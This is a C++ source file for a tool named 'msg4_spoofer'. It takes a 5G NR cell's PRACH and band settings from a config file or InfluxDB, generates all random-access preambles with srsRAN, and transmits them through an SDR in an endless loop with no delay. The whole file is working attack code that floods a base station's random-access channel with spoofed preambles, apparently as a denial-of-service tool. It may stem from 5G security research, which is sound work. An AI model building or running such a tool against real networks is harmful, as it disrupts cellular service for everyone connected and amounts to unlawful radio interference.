#include "config.h"
#include "data_source.h"
#include "influxdb_client.h"
#include "logging.h"
#include "rf_base.h"
#include "srsran/srsran.h"
#include <chrono>
#include <memory>
#include <srsran/phy/utils/vector.h>
#include <string>
#include <thread>
#include <uhd/error.h>
#include <uhd/stream.hpp>
#include <uhd/types/device_addr.hpp>

#define MAX_LEN 70176

spoofer_error_e check_config_validity(spoofer_config_t &config) {
  if (config.rf.device_name != "uhd" && config.rf.device_name != "zmq") {
    LOG_ERROR("invalid device name");
    return CONFIG_ERROR;
  }
  if (config.prach.num_ra_preambles == 0 ||
      config.prach.num_ra_preambles > 64) {

    LOG_ERROR("invalid  number of preambles");
    return CONFIG_ERROR;
  }
  return SUCCESS;
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    LOG_ERROR("Usage: msg4_spoofer <config file>\n");
    return EXIT_FAILURE;
  }

  std::string config_path(argv[1]);
  spoofer_config_t conf = load(config_path);

  if (check_config_validity(conf) != SUCCESS)
    return CONFIG_ERROR;

  // Initialize InfluxDB client if enabled
  std::unique_ptr<InfluxDBClient> influxdb_client = nullptr;
  cell_info_t cell_info = {};
  prach_config_t prach_cfg_from_influx = conf.prach;
  int nof_prb = conf.rf.nof_prb;

  if (conf.influxdb.enabled) {
    // Create InfluxDB client
    influxdb_client = std::make_unique<InfluxDBClient>(conf.influxdb);

    // Check if connection was successful
    if (!influxdb_client->is_connected()) {
      LOG_ERROR(
          "Failed to connect to InfluxDB. Please check your configuration "
          "and InfluxDB server status.");
      return EXIT_FAILURE;
    }

    LOG_INFO("InfluxDB is enabled. Waiting for cell data...");

    // Wait until we get valid data from InfluxDB
    bool data_retrieved = false;
    while (!data_retrieved) {
      // Query complete cell information from InfluxDB
      cell_info = influxdb_client->query_cell_info();

      // Check if we have valid data for all required fields
      if (cell_info.prach.valid && cell_info.band.valid) {
        // We have all required data
        LOG_INFO("Successfully retrieved all required cell data from InfluxDB");
        InfluxDBClient::display_cell_info(cell_info);

        // Use InfluxDB data for PRACH configuration
        prach_cfg_from_influx = cell_info.prach;

        // Preserve time_delay from config as it's not in InfluxDB
        prach_cfg_from_influx.time_delay = conf.prach.time_delay;

        // Use band info for nof_prb if available
        if (cell_info.band.nof_prb > 0) {
          nof_prb = cell_info.band.nof_prb;
          LOG_INFO("Using nof_prb from InfluxDB: %d", nof_prb);
        }

        data_retrieved = true;
      } else {
        // Missing data - show what's missing
        LOG_ERROR("Incomplete data from InfluxDB:");
        if (!cell_info.mib.valid) {
          LOG_ERROR("  - MIB data not available");
        }
        if (!cell_info.prach.valid) {
          LOG_ERROR("  - PRACH configuration not available");
        }
        if (!cell_info.band.valid) {
          LOG_ERROR("  - Band information not available");
        }
        LOG_INFO("Retrying in 1 second...");

        // Wait 1 second before retrying
        std::this_thread::sleep_for(std::chrono::seconds(1));
      }
    }
  } else {
    LOG_INFO("InfluxDB is disabled. Using configuration from file.");
  }

  srsran_prach_t prach;
  srsran_prach_cfg_t prach_cfg;

  prach_cfg.is_nr = true;
  prach_cfg.config_idx = prach_cfg_from_influx.config_idx;
  prach_cfg.hs_flag = false; // NOTE: hardcoded to false for now
  prach_cfg.freq_offset = prach_cfg_from_influx.freq_offset;
  prach_cfg.root_seq_idx = prach_cfg_from_influx.root_seq_idx;
  prach_cfg.zero_corr_zone = prach_cfg_from_influx.zero_corr_zone;
  prach_cfg.num_ra_preambles = prach_cfg_from_influx.num_ra_preambles;

  LOG_INFO("Using PRACH Configuration:");
  LOG_INFO("  Config Index: %d", prach_cfg.config_idx);
  LOG_INFO("  Root Sequence Index: %d", prach_cfg.root_seq_idx);
  LOG_INFO("  Zero Correlation Zone: %d", prach_cfg.zero_corr_zone);
  LOG_INFO("  Frequency Offset: %d", prach_cfg.freq_offset);
  LOG_INFO("  Number of RA Preambles: %d", prach_cfg.num_ra_preambles);
  LOG_INFO("  Number of PRBs: %d", nof_prb);

  uint32_t fft_size = srsran_symbol_sz(nof_prb);
  if (fft_size == 0) {
    LOG_ERROR("Invalid number of PRBs");
    return INIT_ERROR;
  }
  if (srsran_prach_init(&prach, srsran_symbol_sz(nof_prb))) {
    LOG_ERROR("Failed to initialize PRACH");
    return INIT_ERROR;
  }
  if (srsran_prach_set_cfg(&prach, &prach_cfg, nof_prb)) {
    LOG_ERROR("Error configuring PRACH\n");
    return CONFIG_ERROR;
  }

  LOG_INFO("PRACH CONFIGURED");

  // Update RF configuration with InfluxDB data if available
  if (conf.influxdb.enabled && cell_info.band.valid) {
    if (cell_info.band.ul_freq > 0) {
      conf.rf.frequency = cell_info.band.ul_freq;
      LOG_INFO("Using uplink frequency from InfluxDB: %.3f MHz",
               conf.rf.frequency / 1e6);
    }
    if (cell_info.band.sample_rate > 0) {
      conf.rf.srate = cell_info.band.sample_rate;
      LOG_INFO("Using sample rate from InfluxDB: %.2f MHz",
               conf.rf.srate / 1e6);
    }
  }

  LOG_INFO("Creating RF instance for: %s", conf.rf.device_name.c_str());
  std::unique_ptr<RFBase> rf_dev = create_rf_instance(conf);
  if (!rf_dev) {
    LOG_ERROR("Failed to create RF instance. Exiting.");
    return EXIT_FAILURE;
  }

  size_t preamble_len = prach.N_seq + prach.N_cp;

  std::vector<cf_t *> preambles(prach_cfg_from_influx.num_ra_preambles);
  LOG_INFO("Generating %d PRACH preambles...",
           prach_cfg_from_influx.num_ra_preambles);
  // generate all possible preamble combinations
  for (int i = 0; i < preambles.size(); ++i) {
    preambles[i] = srsran_vec_cf_malloc(preamble_len);
    srsran_prach_gen(&prach, i, prach_cfg_from_influx.freq_offset,
                     preambles[i]);
  }
  LOG_INFO("PRACH preambles generated successfully");

  uint32_t current_seq_idx = 0;

  while (true) {

    // TODO: FIX issue where all preambles look the same (gnodeb might ignore
    // it if all the preambles are the same)
    //
    // grab one of the generated preambles
    cf_t *tx_buffer = preambles[current_seq_idx];
    std::vector<std::complex<float>> tx_vector(tx_buffer,
                                               tx_buffer + preamble_len);

    // transmit the preamble on specific slot
    if (rf_dev->transmit(conf, tx_vector) != SUCCESS) {
      LOG_ERROR("Error during transmission.");
      return CONFIG_ERROR;
    }

    current_seq_idx =
        (current_seq_idx + 1) % prach_cfg_from_influx.num_ra_preambles;
    // if (prach_cfg_from_influx.time_delay > 0) {
    //   std::this_thread::sleep_for(
    //       std::chrono::milliseconds(prach_cfg_from_influx.time_delay));
    // }
  }

  // free after use
  for (auto &preamble : preambles) {
    free(preamble);
  }

  // InfluxDB client will be automatically cleaned up (unique_ptr)

  return EXIT_SUCCESS;
}
